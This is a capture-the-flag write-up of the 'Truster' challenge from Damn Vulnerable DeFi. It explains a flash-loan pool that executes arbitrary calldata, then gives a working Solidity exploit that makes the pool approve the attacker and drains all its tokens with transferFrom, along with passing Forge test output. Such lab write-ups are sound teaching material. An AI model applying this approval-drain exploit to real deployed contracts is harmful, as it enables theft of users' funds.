# Overview

Hello everyone! Hope you are doing great!

I'm back again with a new Blockchain/Web3 by tackling the third challenge from the [Damn Vulnerable DeFi](https://www.damnvulnerabledefi.xyz/) series created by [The Red Guild](https://theredguild.org/) where I will be explaining the challenge in depth, my approach to solving it and my solutions.

Hope you enjoy it and learn something new!

Check the previous [Damn Vulnerable DeFi challenge called Naive Receiver from this blog post](https://fouedsaidi.com/2025/12/18/Damn-Vulnerable-DeFi-V4-Naive-Receiver/). Enjoy!

# 'Truster' challenge

## Challenge Description

More and more lending pools are offering flashloans. In this case, a new pool has launched that is offering flashloans of DVT tokens for free.

The pool holds 1 million DVT tokens. You have nothing.

To pass this challenge, rescue all funds in the pool executing a single transaction. Deposit the funds into the designated recovery account.

[Link to the original challenge](https://www.damnvulnerabledefi.xyz/challenges/truster/)

[Github repo link that contains challenge code and solver](https://github.com/kujen5/Damn-Vulnerable-Defi-Solutions/tree/main/Truster)

# Understanding the contract

## Overview

We have 2 main contracts:

### DamnValuableToken.sol

This is the definition contract of the Damn Valuable Token (DVT): an [ERC20()](https://ethereum.org/developers/docs/standards/tokens/erc-20/) token that will be the currency (token) in this project.

We can see that this token has 18 decimals

```javascript
contract DamnValuableToken is ERC20 {
    constructor() ERC20("DamnValuableToken", "DVT", 18) {
        _mint(msg.sender, type(uint256).max);
    }
}
```

### TrusterLenderPool.sol

This is a smart contract that offers [Flash Loans](https://eips.ethereum.org/EIPS/eip-3156) through the `TrusterLenderPool::flashLoan()` method.

1. First we fix the contract balance prior to supplying the flashloan to the borrower:

```javascript
uint256 balanceBefore = token.balanceOf(address(this));
```

2. Next we will transfer the tokens to the borrower wallet:

```javascript
token.transfer(borrower, amount);
```

3. Now the contract allows the borrower to execute a function call through the OpenZeppelin `Address::functionCall()`:

```javascript
target.functionCall(data);
```

We can see below the definition of the method:

```javascript
function functionCall(address target, bytes memory data) internal returns (bytes memory) {
        return functionCallWithValue(target, data, 0);
}
function functionCallWithValue(address target, bytes memory data, uint256 value) internal returns (bytes memory) {
        if (address(this).balance < value) {
            revert Errors.InsufficientBalance(address(this).balance, value);
        }
        bool success = LowLevelCall.callNoReturn(target, value, data);
        if (success && (LowLevelCall.returnDataSize() > 0 || target.code.length > 0)) {
            return LowLevelCall.returnData();
        } else if (success) {
            revert AddressEmptyCode(target);
        } else if (LowLevelCall.returnDataSize() > 0) {
            LowLevelCall.bubbleRevert();
        } else {
            revert Errors.FailedCall();
        }
    }
```

What this basically does is that it will take a target contract address and some calldata, then it will execute the bytes function call from within the calldata as a low level call. Providing direct arbitrary method execution.

4. Finally we will make a check that the borrower actually returned the loaned amount to the contract:

```javascript
if (token.balanceOf(address(this)) < balanceBefore) {
            revert RepayFailed();
        }
```

## Point of Failure

What directly stands out from the contract is the usage of `functionCall()` applied on a user-supplied target contract. This represents a very serious issue as the user can invoke whatever method they want (by encoding the method ABI and executing it on the target as a low level call.). This will allow the borrower to approve token spending from the contract and then steal all the tokens after the flash loan transaction finishes.

# Exploitation

Our main goal from the challenge is to rescue all the tokens and send them to the recovery account wallet.

The steps to do this are clear:

1. Create calldata that will be used to approve coins spending **BY** the contract itself, because it is the owner of the contract and the only one that can allow spending:

```javascript
bytes memory data=abi.encodeWithSignature("approve(address,uint256)", address(this),p_token.balanceOf(address(p_pool)));
```

This will encode the `approve` method which approves the spending of the entire contract balance: `p_token.balanceOf(address(p_pool))` to the malicious contract: `address(this)`

2. Next, we will request a flash loan with 0 DVT, this is to pass the `if (token.balanceOf(address(this)) < balanceBefore)` check. We will pass the current exploit contract as the borrower and the `Truster` contract as the target contract (so the approval happens through it and gets validated.):

```javascript
p_pool.flashLoan(0,address(this),address(p_token),data); //this doesn't take any money from the contract
```

3. Finally, after the flashloan transaction finishes, we will find ourselves with the spending of the entire contract balance **approved**. So we can just send all the tokens to the recovery challenge and successfully rescue them:

```javascript
p_token.transferFrom(address(p_pool),p_recovery,p_token.balanceOf(address(p_pool)));
```

## Exploit Test Case

Below you can find the full test case.
First, the exploitation contract (because we have to call a contract inside the `functionCall` method):

```javascript
contract TrusterExploit {
    TrusterLenderPool pool;
    DamnValuableToken token;
    address public recovery;

    constructor(TrusterLenderPool p_pool,DamnValuableToken p_token,address p_recovery){
        bytes memory data=abi.encodeWithSignature("approve(address,uint256)", address(this),p_token.balanceOf(address(p_pool)));
        p_pool.flashLoan(0,address(this),address(p_token),data);
        p_token.transferFrom(address(p_pool),p_recovery,p_token.balanceOf(address(p_pool)));
        
    }
}
```

And the call from inside the test case:

```javascript
function test_truster() public checkSolvedByPlayer {
        new TrusterExploit(pool,token,recovery);
    }
```

This takes the `checkSolvedByPlayer` modifier behavior which performs these checks:

```javascript
assertEq(vm.getNonce(player), 1, "Player executed more than one tx");

// All rescued funds sent to recovery account
assertEq(token.balanceOf(address(pool)), 0, "Pool still has tokens");
assertEq(token.balanceOf(recovery), TOKENS_IN_POOL, "Not enough tokens in recovery account");
```

The output is as follows:

```javascript
$ forge test -vv
[⠊] Compiling...
[⠒] Compiling 1 files with Solc 0.8.25
[⠑] Solc 0.8.25 finished in 593.10ms
Compiler run successful!

Ran 2 tests for test/Truster.t.sol:TrusterChallenge
[PASS] test_assertInitialState() (gas: 20313)
[PASS] test_truster() (gas: 165133)
Logs:
  Contract balance before exploit:  1000000000000000000000000

---Exploit---

  Contract balance after exploit:  0

Suite result: ok. 2 passed; 0 failed; 0 skipped; finished in 1.62ms (396.70µs CPU time)

Ran 1 test suite in 7.93ms (1.62ms CPU time): 2 tests passed, 0 failed, 0 skipped (2 total tests)
```

And Tadaaa! Solved!

# Conclusion

That was it for the `Truster` challenge from `Damn Vulnerable DeFi` series.

You can find through [this github link the repository that contains my solver](https://github.com/kujen5/Damn-Vulnerable-Defi-Solutions/tree/main/Truster) and all the future Damn Vulnerable DeFi solutions Inshallah!

See you next time~